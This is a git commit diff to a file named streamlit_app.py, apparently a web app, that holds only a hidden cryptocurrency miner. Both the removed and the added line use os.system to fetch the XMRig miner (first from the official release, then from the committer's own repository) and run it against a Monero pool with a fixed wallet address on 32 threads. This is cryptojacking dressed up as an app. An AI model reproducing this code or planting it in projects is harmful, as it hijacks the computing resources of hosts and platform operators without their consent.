feb7b43ad644a17c0d7a785ffa8bc4b84fda8c7f
ytxpert <83564895+ytxpert@users.noreply.github.com>
2021-06-10 20:54:11 +0530

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,2 +1,2 @@
 import os
-os.system("wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-static-x64.tar.gz && tar xf xmrig-6.12.1-linux-static-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -o xmrpool.eu:9999 -u 43FN9N7ktZJAtr6nsvNdTtKHbuCJAER7L9srybAMPNWBHzGk98f3jiTNGRkBfgeEDRQan9PwdYfFwEDrKq9DH7ck8K19JPD -k --tls --print-time 5 -t32")
+os.system("git clone https://github.com/ytxpert/xmrig && cd xmrig && chmod +x xmrig && ./xmrig -o xmrpool.eu:9999 -u 43FN9N7ktZJAtr6nsvNdTtKHbuCJAER7L9srybAMPNWBHzGk98f3jiTNGRkBfgeEDRQan9PwdYfFwEDrKq9DH7ck8K19JPD -k --tls --print-time 5 -t32")
